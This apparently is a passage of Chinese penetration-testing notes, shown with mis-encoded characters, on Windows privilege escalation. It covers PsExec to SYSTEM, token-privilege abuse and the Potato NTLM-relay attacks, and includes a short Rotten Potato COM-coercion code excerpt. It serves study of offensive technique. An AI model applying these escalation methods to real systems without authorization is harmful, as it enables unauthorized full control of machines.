
<h2 id="åˆ©ç”¨-psexec-ææƒwin2003--win2008">åˆ©ç”¨ PsExec ææƒ(Win2003 &amp; Win2008)</h2>
<p>PsExec æ˜¯ windows å†…æ ¸å¥—ä»¶ SysInternalSuite ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥ä» Administrator ææƒåˆ° SYSTEM</p>

<p>ä¸‹è½½åœ°å€:<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/">Sysinternals Utilities - Sysinternals | Microsoft Learn</a></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PsExec -i -s cmd
</code></pre></div></div>

<p>å‚è€ƒ</p>
<ul>
  <li><a href="https://github.com/SexyBeast233/SecBooks/blob/main/%E3%80%90%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E3%80%91bypass/%E5%AE%9E%E6%88%98%E9%81%87%E8%A7%81%E5%88%B0%E7%9A%84%E5%A5%BD%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E9%9B%86%E5%90%88.md">SecBooks/ã€å…¬ä¼—å·æ–‡ç« ã€‘bypass/å®æˆ˜é‡è§åˆ°çš„å¥½ç”¨ææƒæ–¹æ³•é›†åˆ.md at main Â· SexyBeast233/SecBooks</a></li>
</ul>

<h2 id="åˆ©ç”¨-windows-è‡ªå¸¦æ–‡ä»¶è„šæœ¬ææƒ">åˆ©ç”¨ Windows è‡ªå¸¦æ–‡ä»¶ã€è„šæœ¬ææƒ</h2>
<p>Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/</p>

<h2 id="æ»¥ç”¨-token-ææƒ">æ»¥ç”¨ Token ææƒ</h2>
<p>æ¡ä»¶ï¼š</p>
<ul>
  <li>å·²ç»æ‹¿åˆ°éç®¡ç†å‘˜æƒé™çš„æœåŠ¡å¸æˆ·</li>
</ul>

<p>æ•ˆæœï¼š</p>
<ul>
  <li>ææƒè‡³ SYSTEM</li>
</ul>

<h3 id="èƒŒæ™¯çŸ¥è¯†">èƒŒæ™¯çŸ¥è¯†</h3>

<hr />
<p>å½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªè®¿é—®ä»¤ç‰Œã€‚ç”¨æˆ·æ‰§è¡Œçš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è¯¥è®¿é—®ä»¤ç‰Œçš„å‰¯æœ¬ã€‚ä»¤ç‰Œæ ‡è¯†äº†ç”¨æˆ·ã€ç”¨æˆ·çš„ç»„ã€ç”¨æˆ·çš„æƒé™ä»¥åŠSIDï¼ˆå®‰å…¨æ ‡è¯†ç¬¦ï¼‰ã€‚</p>

<p>å½“æœ¬åœ°ç®¡ç†å‘˜ç™»å½•æ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸¤ä¸ªè®¿é—®ä»¤ç‰Œï¼šä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™ï¼Œå¦ä¸€ä¸ªå…·æœ‰æ™®é€šæƒé™ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“è¯¥ç”¨æˆ·æ‰§è¡Œè¿›ç¨‹æ—¶ï¼Œå°†ä½¿ç”¨å…·æœ‰å¸¸è§„ï¼ˆéç®¡ç†å‘˜ï¼‰æƒé™çš„è¿›ç¨‹ã€‚å½“æ­¤ç”¨æˆ·å°è¯•ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä»»ä½•æ“ä½œï¼ˆä¾‹å¦‚â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ï¼‰æ—¶ï¼Œå°†ä½¿ç”¨ UAC æ¥è¯·æ±‚æƒé™ã€‚</p>

<p>ä½¿ç”¨ whoami /priv å¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™ã€‚æ‹¥æœ‰ä¸‹é¢æƒé™æ—¶å¯è€ƒè™‘ä½¿ç”¨è¿™ç§æ–¹å¼ï¼š</p>
<ul>
  <li>iis sqlserver çš„ç”¨æˆ·é€šå¸¸å…·æœ‰ SeImpersonatePrivilege å’Œ SeAssignPrimaryPrivilege æƒé™ã€‚</li>
  <li>æœåŠ¡ç”¨æˆ·é€šå¸¸æ‹¥æœ‰ SeBackupPrivilege å’Œ SeRestorePrivilege æƒé™ã€‚</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    SeIncreaseQuotaPrivilege: DISABLED
    SeShutdownPrivilege: DISABLED
    SeAuditPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
</code></pre></div></div>

<p><strong>ä¸åŒçš„å‡ ç§æƒé™å¯èƒ½ä¼šç”¨äºä¸åŒçš„æ”»å‡»åœºæ™¯</strong></p>

<p><strong>1. SeImpersonatePrivilege</strong>
ä»»ä½•æ‹¥æœ‰æ­¤æƒé™çš„è¿›ç¨‹éƒ½å¯ä»¥æ¨¡æ‹Ÿï¼ˆä½†ä¸èƒ½åˆ›å»ºï¼‰å®ƒèƒ½å¤Ÿå¤„ç†çš„ä»»ä½•ä»¤ç‰Œã€‚  æ‚¨å¯ä»¥ä» Windows æœåŠ¡ (DCOM) è·å–ç‰¹æƒä»¤ç‰Œï¼Œä½¿å…¶é’ˆå¯¹è¯¥æ¼æ´æ‰§è¡Œ NTLM èº«ä»½éªŒè¯ï¼Œç„¶åä»¥ SYSTEM èº«ä»½æ‰§è¡Œè¿›ç¨‹ã€‚</p>

<p>åˆ©ç”¨æ–¹æ³•ï¼š</p>
<ol>
  <li>
    <p>ä½¿ç”¨ NTLM relay åˆ°æœ¬åœ°åå•†è·å¾—ç³»ç»Ÿç”¨æˆ·çš„ tokenã€‚</p>
  </li>
  <li>
    <p>å¯ä»¥ä½¿ç”¨å¼€æºå·¥å…·çƒ‚åœŸè±†ã€å­¤ç‹¬åœŸè±†æˆ–å¤šæ±åœŸè±†ã€‚</p>
  </li>
  <li>
    <p>é€šè¿‡WinAPI CreateProcessWithTokenåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œä¼ å…¥ç³»ç»Ÿç”¨æˆ·çš„ä»¤ç‰Œã€‚</p>
  </li>
</ol>

<p>åªæœ‰å…·æœ‰SeImpersonatePrivilegeæƒé™æ‰èƒ½æˆåŠŸåˆ›å»ºã€‚</p>

<p><strong>2. SeAssignPrimaryPrivilege</strong>
å®ƒä¸ SeImpersonatePrivilege éå¸¸ç›¸ä¼¼ï¼Œå®ƒå°†ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•æ¥è·å–ç‰¹æƒä»¤ç‰Œã€‚
ç„¶åï¼Œæ­¤æƒé™å…è®¸å°†ä¸»ä»¤ç‰Œåˆ†é…ç»™æ–°çš„/æŒ‚èµ·çš„è¿›ç¨‹ã€‚<br />
ä½¿ç”¨ç‰¹æƒæ¨¡æ‹Ÿä»¤ç‰Œï¼Œæ‚¨å¯ä»¥æ´¾ç”Ÿä¸»ä»¤ç‰Œ (DuplicateTokenEx)ã€‚æœ‰äº†ä»¤ç‰Œï¼Œæ‚¨å¯ä»¥ä½¿ç”¨â€œCreateProcessAsUserâ€åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œæˆ–è€…åˆ›å»ºä¸€ä¸ªæŒ‚èµ·çš„è¿›ç¨‹å¹¶è®¾ç½®ä»¤ç‰Œï¼ˆé€šå¸¸ï¼Œæ‚¨ä¸èƒ½ä¿®æ”¹æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„ä¸»ä»¤ç‰Œï¼‰ã€‚</p>

<p>åˆ©ç”¨æ–¹æ³•ï¼š</p>
<ul>
  <li>åˆ©ç”¨ NTLM Relay åˆ°å½“åœ°è°ˆåˆ¤è·å¾—ç³»ç»Ÿç”¨æˆ·çš„ token</li>
  <li>é€šè¿‡ WinAPI CreateProcessAsUser åˆ›å»ºæ–°è¿›ç¨‹ï¼Œä¼ å…¥ç³»ç»Ÿç”¨æˆ·çš„ tokenï¼Œè¯¥ token å…·æœ‰ç³»ç»Ÿæƒé™ã€‚</li>
</ul>

<p><strong>3. SeBackupPrivilege</strong>
æ­¤æƒé™ä½¿ç³»ç»Ÿæˆäºˆå¯¹ä»»ä½•æ–‡ä»¶çš„æ‰€æœ‰è¯»å–è®¿é—®æ§åˆ¶ï¼ˆä»…é™è¯»å–ï¼‰ã€‚ä½¿ç”¨å®ƒä»æ³¨å†Œè¡¨ä¸­è¯»å–æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œç„¶åå°†â€œpsexecâ€æˆ–â€œwmicexecâ€ä¸å“ˆå¸Œå€¼ (PTH) ç»“åˆä½¿ç”¨ã€‚</p>

<p>å¦‚æœæœ¬åœ°ç®¡ç†å‘˜è¢«ç¦ç”¨ï¼Œæˆ–è€…é…ç½®ä¸ºæœ¬åœ°ç®¡ç†å‘˜åœ¨è¿œç¨‹è¿æ¥æ—¶ä¸æ˜¯ç®¡ç†å‘˜ï¼Œåˆ™æ­¤æ”»å‡»å°†ä¸èµ·ä½œç”¨ã€‚</p>

<p>æ”»å‡»åœºæ™¯ï¼šæ”¶é›†</p>

<p><strong>4. SeRestorePrivilege</strong>
å¯¹ç³»ç»Ÿä¸Šä»»ä½•æ–‡ä»¶çš„å†™å…¥è®¿é—®æ§åˆ¶ï¼Œæ— è®ºæ–‡ä»¶ ACL ä¸ºä½•ã€‚ä½ å¯ä»¥ä¿®æ”¹æœåŠ¡ã€DLLåŠ«æŒã€è®¾ç½®è°ƒè¯•å™¨ï¼ˆå›¾åƒæ–‡ä»¶æ‰§è¡Œé€‰é¡¹ï¼‰â€¦â€¦å¾ˆå¤šé€‰é¡¹å¯ä»¥å‡çº§</p>
<blockquote>
  <p>æ”»å‡»åœºæ™¯ï¼šæŒä¹…åŒ–ï¼›é˜²å¾¡è§„é¿</p>
</blockquote>

<p><strong>5. SeCreateTokenPrivilege</strong>
ä»…å½“ç”¨æˆ·å¯ä»¥æ¨¡æ‹Ÿä»¤ç‰Œï¼ˆå³ä½¿æ²¡æœ‰ SeImpersonatePrivilegeï¼‰æ—¶ï¼Œæ­¤ä»¤ç‰Œæ‰å¯ä»¥ç”¨ä½œ EoP æ–¹æ³•ã€‚
åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä»¤ç‰Œé’ˆå¯¹åŒä¸€ç”¨æˆ·å¹¶ä¸”å®Œæ•´æ€§çº§åˆ«å°äºæˆ–ç­‰äºå½“å‰è¿›ç¨‹å®Œæ•´æ€§çº§åˆ«ï¼Œåˆ™ç”¨æˆ·å¯ä»¥æ¨¡æ‹Ÿä»¤ç‰Œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿä»¤ç‰Œå¹¶å‘å…¶æ·»åŠ ç‰¹æƒç»„ SIDã€‚</p>
<blockquote>
  <p>æ”»å‡»æ–¹å¼ï¼šææƒ</p>
</blockquote>

<p><strong>6. SeLoadDriverPrivilege</strong>
åŠ è½½å’Œå¸è½½è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚</p>
<blockquote>
  <p>æ”»å‡»æ–¹å¼ï¼šæŒä¹…åŒ–ï¼›é˜²å¾¡è§„é¿</p>
</blockquote>

<p><strong>7. SeTakeOwnershipPrivilege</strong>
æ­¤æƒé™ä¸ SeRestorePrivilege éå¸¸ç›¸ä¼¼ã€‚å®ƒå…è®¸è¿›ç¨‹é€šè¿‡æˆäºˆ WRITE_OWNER è®¿é—®æƒé™æ¥â€œè·å¾—å¯¹è±¡çš„æ‰€æœ‰æƒï¼Œè€Œæ— éœ€æˆäºˆä»»æ„è®¿é—®æƒé™â€ã€‚é¦–å…ˆï¼Œæ‚¨å¿…é¡»è·å¾—è¦å†™å…¥çš„æ³¨å†Œè¡¨é¡¹çš„æ‰€æœ‰æƒå¹¶ä¿®æ”¹ DACLï¼Œä»¥ä¾¿å¯ä»¥åœ¨å…¶ä¸Šå†™å…¥ã€‚</p>
<blockquote>
  <p>æ”»å‡»åœºæ™¯ï¼šæŒä¹…åŒ–ï¼›é˜²å¾¡è§„é¿ï¼›æ”¶é›†</p>
</blockquote>

<p><strong>8. SeDebugPrivilege</strong>
å®ƒå…è®¸æŒæœ‰è€…è°ƒè¯•å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™åŒ…æ‹¬è¯»å–å’Œå†™å…¥è¯¥è¿›ç¨‹çš„å†…å­˜ã€‚æœ‰è®¸å¤šä¸åŒçš„å†…å­˜æ³¨å…¥ç­–ç•¥å¯ä»¥ä¸æ­¤ç‰¹æƒä¸€èµ·ä½¿ç”¨ï¼Œä»è€Œè§„é¿å¤§å¤šæ•° AV/HIPS è§£å†³æ–¹æ¡ˆã€‚</p>
<blockquote>
  <p>æ”»å‡»æ–¹å¼ï¼šå‡­æ®çªƒå–ã€ææƒã€é˜²å¾¡è§„é¿ç­‰ã€‚</p>
</blockquote>

<p><strong>9. SeTcbPrivilege</strong>
æ­¤æƒé™å°†å…¶æŒæœ‰è€…æ ‡è¯†ä¸ºå—ä¿¡ä»»è®¡ç®—æœºåº“çš„ä¸€éƒ¨åˆ†ã€‚æŸäº›å—ä¿¡ä»»çš„å—ä¿æŠ¤å­ç³»ç»Ÿè¢«æˆäºˆæ­¤ç‰¹æƒã€‚</p>

<blockquote>
  <p>æ”»å‡»åœºæ™¯ï¼šæƒé™æå‡</p>
</blockquote>

<p><strong>å‚è€ƒï¼š</strong></p>
<ul>
  <li><a href="https://www.wangan.com/p/7fy747bffedd4919">Windows TokenåŸç†åŠåˆ©ç”¨ - ç½‘å®‰</a></li>
  <li><a href="https://www.thehackerworld.com/Hacker-topic/20369.html/">æ¸—é€æŠ€å·§â€”â€”åˆ©ç”¨Windowsçš„ä¹å¤§æƒé™ - WEB and server security vulnerabilities - é»‘å®¢ä¸­æ–‡è®ºå›ç½‘ç«™</a></li>
</ul>

<hr />

<p>åŸºäº Token ææƒçš„åˆ©ç”¨å·¥å…·å°±æ˜¯å¸¸ç”¨çš„ Potato å®¶æ—äº†ï¼š</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120023623.png" alt="20231120023623" /></p>

<h3 id="origin-potatoms08-068">Origin Potato(MS08-068)</h3>
<p>Origin Potato å°±æ˜¯ NTLM-Relayï¼Œå¾®è½¯åœ¨ kb957097 è¡¥ä¸ä¸­é€šè¿‡ä¿®å¤ SMB èº«ä»½éªŒè¯ç­”å¤çš„éªŒè¯æ–¹å¼æ¥é˜²æ­¢å‡­æ®é‡æ’­ã€‚</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120071554.png" alt="20231120071554" /></p>

<p>å½“ä¸»æœº A å‘ä¸»æœº B è¿›è¡Œ SMB è®¤è¯çš„æ—¶å€™ï¼Œå°† pszTargetName è®¾ç½®ä¸º cifs/Bï¼Œç„¶ååœ¨ type2 æ‹¿åˆ° B å‘é€çš„ Challenge ä¹‹åï¼Œåœ¨ lsass é‡Œé¢ç¼“å­˜ (Challenge,cifs/B)ï¼Œæ¥ç€ B æ‹¿åˆ° A çš„ type3ï¼Œè¿™æ—¶ä¼šå»æ£€æŸ¥ lsass ç¼“å­˜é‡Œæ˜¯å¦æœ‰ (Challenge,cifs/B)ï¼Œå¦‚æœæœ‰å°±è¯´æ˜è¿™æ˜¯åŒä¸€å°ä¸»æœºï¼Œé‚£ä¹ˆè®¤è¯å¤±è´¥ã€‚</p>

<h3 id="hot-potato">Hot Potato</h3>
<p>Hot Potato æ˜¯ Potato å®¶æ—æœ€æ—©çš„åˆ©ç”¨æ–¹å¼ï¼Œå…¶æ”»å‡»åŸç†å¦‚ä¸‹ï¼š</p>
<ol>
  <li>Windows Update æœåŠ¡ä»¥ SYSTEM æƒé™è¿è¡Œï¼Œä¸”ä¼šå‘èµ· NTLM è®¤è¯ï¼Œå¦‚æœèƒ½å¤Ÿä½œä¸ºä¸­é—´äººï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿé€šè¿‡ NTLM Relay è·å–åˆ° SYSTEM æƒé™ã€‚</li>
  <li>Windows Update æœåŠ¡åœ¨è¿è¡Œæ—¶ä¼šé»˜è®¤è¯·æ±‚ http://wpad/wpad.dat è¿™ä¸ª  URL ä»¥è·å–ç½‘ç»œä»£ç†çš„é…ç½®ï¼Œä½†è¿™ä¸ªåŸŸåå¹¶ä¸æ˜¯æ‰€æœ‰ä¸»æœºéƒ½ä¼šé…ç½®ï¼Œå…¬ç½‘ä¸Šä¹Ÿæ²¡æœ‰è¿™ä¸ªåŸŸåï¼Œæ ¹æ® Windows çš„åŸŸåè§£æé¡ºåºï¼ˆhost-&gt; DNS æŸ¥è¯¢ -&gt; NBNS æŸ¥è¯¢ï¼‰ï¼Œåªè¦æ”»å‡»è€…ä¼ªé€ ä¸€ä¸ª NBNS æŸ¥è¯¢çš„å“åº”ï¼Œå°±èƒ½å¤Ÿæ§åˆ¶ Windows Update æœåŠ¡çš„ä»£ç†æŒ‡å‘è‡ªå·±ã€‚</li>
  <li>æ”»å‡»è€…ä»¥ä¸­é—´äººçš„èº«ä»½å®Œæˆ NTLM Relay ä»è€Œè·å–åˆ° System æƒé™çš„ tokenã€‚</li>
</ol>

<p>å½±å“èŒƒå›´ï¼š</p>
<ul>
  <li>Windows 7,8,10,Server 2008 ä»¥åŠ Server 2012</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120023106.png" alt="20231120023106" /></p>

<p>å…¶æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
  <li>Windows Update æœåŠ¡é»˜è®¤æƒ…å†µä¸‹ä¼šè¯·æ±‚ http://wpad/wpad.dat æ¥è·å–ç½‘ç»œä»£ç†é…ç½®ã€‚ä½†ä¸æ˜¯æ‰€æœ‰çš„ä¸»æœºéƒ½å­˜åœ¨ä¿å­˜ç€è¯¥åŸŸåè§£æçš„ç»“æœï¼Œå½“æœ¬åœ° HOST åŠ DNS æŸ¥è¯¢éƒ½æ— æ³•è·å–è¯¥åŸŸåçš„è§£æç»“æœæ—¶ï¼Œå°±ä¼šè§¦å‘ NBNS æŸ¥è¯¢ã€‚</li>
  <li>æ”»å‡»è€…åœ¨æœ¬åœ°å‘èµ· NBNSï¼ˆNetBIOS åç§°æœåŠ¡ï¼‰æ¬ºéª—ã€‚ä½¿å¾— Windows åœ¨æœ¬åœ°å¹¿æ’­æŸ¥è¯¢ç›®æ ‡ HOST æ—¶ï¼Œæ”»å‡»è€…ä¼ªé€ å“åº”ï¼Œå£°ç§° wpad æœåŠ¡å™¨ IP åœ°å€ä¸º 127.0.0.1ï¼Œå¹¶ä¸”è¿”å›ç½‘ç»œä»£ç†é…ç½®ä¸º 127.0.0.1:80</li>
  <li>Windows Update æœåŠ¡è·å–åˆ°ç½‘ç»œä»£ç†åï¼Œæ‰€æœ‰çš„ http æµé‡å°±éƒ½ä¼šç»è¿‡æ”»å‡»è€…æ­å»ºçš„ 127.0.0.1:80ã€‚</li>
  <li>æ­¤æ—¶ Windows Update æœåŠ¡è¿›è¡Œ NTLM è®¤è¯ä¸­çš„ Hash å°±ä¼šè¢«æ”»å‡»è€…æ•è·ï¼Œä»è€Œå‘èµ· NTLM Relay æ”»å‡»ã€‚</li>
</ol>

<p>å±€é™ï¼š
è¿™ç§æ”»å‡»æ‰‹æ³•éœ€è¦ç­‰å¾… windows update æœåŠ¡å‘èµ·æ›´æ–°è¯·æ±‚ã€‚</p>

<h3 id="rotten-potato">Rotten Potato</h3>
<p>æ”»å‡»åŸç†ï¼š</p>
<ol>
  <li>COM ï¼ˆç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼‰API å¯ä»¥åœ¨æŒ‡å®šçš„ç½‘ç»œä½ç½®åŠ è½½ä¸€ä¸ªæœåŠ¡å¯¹è±¡ã€‚ä»¥ä¸‹é¢çš„ä»£ç ä¸ºä¾‹ï¼ŒCOM API å‡½æ•° CoGetInstanceFromIStorage ä¼šæ ¹æ®æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£å· 127.0.0.1:6666 å»è·å–æŒ‡å®šçš„å¯¹è±¡å®ä¾‹ï¼Œè¯¥å¯¹è±¡å®ä¾‹çš„ Guid ä¸º 4991d34b-80a1-4291-83b6-3328366b9097ï¼Œå¯¹åº” BITS å®ä¾‹ã€‚å¦‚æœæ­¤æ—¶æ”»å‡»è€…åœ¨ 127.0.0.1:6666 ç«¯å£æ­£å¸¸å›å¤ï¼Œå°±å¯ä»¥å¼ºåˆ¶è®© COM ä»¥ SYSTEM æƒé™å¯¹ 6666 ç«¯å£å‘èµ· net-NTLM è®¤è¯ã€‚ï¼ˆä¸ºä»€ä¹ˆé€‰æ‹© BITS å®ä¾‹ï¼Œ<strong>æ˜¯å› ä¸º BITS å®ç°äº† IMarshal æ¥å£</strong>å¹¶å…è®¸ä»£ç†å£°æ˜å¼ºåˆ¶ NTLM èº«ä»½éªŒè¯ï¼‰
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">BootstrapComMarshal</span><span class="p">()</span>
 <span class="p">{</span>
 <span class="n">IStorage</span> <span class="n">stg</span> <span class="o">=</span> <span class="n">ComUtils</span><span class="p">.</span><span class="n">CreateStorage</span><span class="p">();</span>
    
 <span class="c1">// Use a known local system service COM server, in this cast BITSv1</span>
 <span class="n">Guid</span> <span class="n">clsid</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Guid</span><span class="p">(</span><span class="s">"4991d34b-80a1-4291-83b6-3328366b9097"</span><span class="p">);</span>
    
 <span class="n">TestClass</span> <span class="n">c</span> <span class="o">=</span> <span class="n">new</span> <span class="n">TestClass</span><span class="p">(</span><span class="n">stg</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="n">Format</span><span class="p">(</span><span class="s">"{0}[{1}]"</span><span class="p">,</span> <span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">6666</span><span class="p">));</span> <span class="c1">// ip and port</span>
    
 <span class="n">MULTI_QI</span><span class="p">[]</span> <span class="n">qis</span> <span class="o">=</span> <span class="n">new</span> <span class="n">MULTI_QI</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">pIID</span> <span class="o">=</span> <span class="n">ComUtils</span><span class="p">.</span><span class="n">IID_IUnknownPtr</span><span class="p">;</span>
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">pItf</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">hr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    
 <span class="n">CoGetInstanceFromIStorage</span><span class="p">(</span><span class="n">null</span><span class="p">,</span> <span class="n">ref</span> <span class="n">clsid</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">CLSCTX</span><span class="p">.</span><span class="n">CLSCTX_LOCAL_SERVER</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>       <span class="n">qis</span><span class="p">);</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå®Œæˆè¿™ä¸€æ¬¡ NTLM è®¤è¯ï¼Œå°±å¯ä»¥è·å–åˆ° tokenï¼Œ<strong>ä½œè€…ä¹Ÿä½¿ç”¨äº†ä¸€ä¸ªå·§å¦™çš„æ–¹æ³•ï¼Œè°ƒç”¨ AcceptSecurityContext å‡½æ•°æ¥å¤„ç† NLTM è®¤è¯</strong>
    <ol>
      <li>AcceptSecurityContext æ˜¯ Windows API ä¸­ç”¨äºå®‰å…¨ä¸Šä¸‹æ–‡å»ºç«‹çš„å‡½æ•°ä¹‹ä¸€ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨å®‰å…¨å¥—æ¥å­—ï¼ˆSecure Socket Layerï¼ŒSSLï¼‰æˆ–è€…å®‰å…¨çš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRemote Procedure Callï¼ŒRPCï¼‰ç­‰åœºæ™¯ä¸‹ã€‚å®ƒé€šå¸¸ç”¨äºåœ¨<strong>æœåŠ¡ç«¯æ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„èº«ä»½éªŒè¯</strong>ï¼Œå¹¶å»ºç«‹ä¸€ä¸ªå®‰å…¨ä¸Šä¸‹æ–‡ï¼ˆsecurity contextï¼‰ä»¥ä¾¿è¿›è¡Œåç»­çš„å®‰å…¨é€šä¿¡ã€‚<strong>è¿™æ ·ä¸€æ¥ï¼ŒCOM å……å½“å®¢æˆ·ç«¯ï¼ŒAcceptSecurityContext å……å½“æœåŠ¡ç«¯ï¼Œå°±èƒ½å¤Ÿå®Œæˆ NTLM è®¤è¯ã€‚</strong></li>
    </ol>
  </li>
  <li>å°½ç®¡æ”»å‡»è€…ä½œä¸ºä¸­é—´äººå°† AcceptSecurityContext ä¸ COM ä¹‹é—´å»ºç«‹èµ·äº† NTLM è®¤è¯ï¼Œä½†ä¸¤è€…ä¹‹é—´çš„äº¤äº’è¿‡ç¨‹å¹¶ä¸æ˜¯ç®€å•çš„è½¬å‘ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªé—®é¢˜ï¼š
    <ol>
      <li>è¦æ­£ç¡®å“åº” COM æœåŠ¡ï¼Œéœ€è¦æ­£ç¡®çš„ RPC åè®®çš„æ•°æ®åŒ…ã€‚ä½œè€…å°† <strong>COM çš„è¯·æ±‚å‘é€åˆ° 135 ç«¯å£çš„ rpcss æœåŠ¡æ¥è·å–ä¸€ä¸ªå“åº”æ¨¡æ¿</strong>ã€‚</li>
      <li>ä¸¤ä¸ªæ¬¡ NTLM Challenge æŠ¥æ–‡ä¸­çš„ NTLM Server Challenge ä»¥åŠ Reserved å­—æ®µä¸åŒï¼Œéœ€è¦è¿›è¡Œä¿®æ”¹ã€‚</li>
    </ol>
  </li>
  <li>ä¸Šè¿°çš„ä¸¤ä¸ªé—®é¢˜è§£å†³ä¹‹åï¼Œå°±å¯ä»¥å·§å¦™åœ°è·å–åˆ° SYSTEM tokenã€‚æœ‰äº† SYSTEM æƒé™çš„ token ä¹‹åï¼Œå¦‚æœå½“å‰ç”¨æˆ·æ‹¥æœ‰ SelmpersonatePrivilege æˆ–è€… SeAssignPrimaryToken æƒé™ï¼Œå°±å¯ä»¥é€šè¿‡è¯¥ Token åˆ›å»ºæ–°è¿›ç¨‹è¾¾æˆææƒã€‚</li>
</ol>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120024104.png" alt="20231120024104" /></p>

<p>æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
  <li>åˆ©ç”¨ CoGetInstanceFromIStorage API å¼ºåˆ¶ NT AUTHORITY/SYSTEM è¿è¡Œçš„ RPC æœåŠ¡å‘æˆ‘ä»¬çš„æœ¬åœ°ä»£ç†(localhost:6666)å‘èµ· NTLM èº«ä»½éªŒè¯ã€‚
    <ol>
      <li>CoGetInstanceFromIStorage API</li>
    </ol>
  </li>
  <li>RPC å‘ä»£ç†å‘é€ NTLM Negotiate åŒ…ã€‚</li>
  <li>ä»£ç†å°† NTLM Negotiate åŒ…è½¬å‘ç»™ç«¯å£ 135 çš„ RPC æœåŠ¡ã€‚äºæ­¤åŒæ—¶ï¼Œè°ƒç”¨ AcceptSecurityContext æ¥å¼ºåˆ¶è¿›è¡Œæœ¬åœ°èº«ä»½éªŒè¯ã€‚</li>
  <li>RPC 135 å’Œ AcceptSecurityContext å‘ä»£ç†å‘é€ NTLM Challengeã€‚ä¸¤ä¸ªæ•°æ®åŒ…çš„å†…å®¹è¢«æ··åˆä»¥åŒ¹é…æœ¬åœ°åå•†å¹¶è½¬å‘åˆ° RPCï¼Œå…¶ä¸­ RPC 135 å“åº”çš„æŠ¥æ–‡å……å½“ RPC è°ƒç”¨çš„æ¨¡æ¿ã€‚</li>
  <li>RPC ä½¿ç”¨ NLTM Auth åŒ…è¿›è¡Œå“åº”ï¼Œè¯¥åŒ…è¢«ä»£ç†æœåŠ¡å™¨å‘é€åˆ° AcceptSecurityContext (8.) å¹¶æ‰§è¡Œæ¨¡æ‹Ÿ (9.)ã€‚</li>
</ol>

<p>å½±å“èŒƒå›´ï¼š</p>
<ul>
  <li>&lt; win10 1809 å’Œ windows server 2019</li>
</ul>

<hr />
<p>ç›¸å…³æ¦‚å¿µï¼š</p>
<ol>
  <li>åˆ†å¸ƒå¼ç»„ä»¶å¯¹è±¡æ¨¡å‹(DCOM)
    <ol>
      <li>COM æ˜¯ Windows çš„ä¸€ä¸ªç»„ä»¶ï¼Œå®ƒä¿ƒè¿›äº†è½¯ä»¶ä¹‹é—´çš„äº’æ“ä½œæ€§ï¼ŒDCOM é€šè¿‡è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(RPC)åœ¨ç½‘ç»œä¸Šæ‰©å±•äº†è¿™ä¸€ç‚¹ã€‚</li>
    </ol>
  </li>
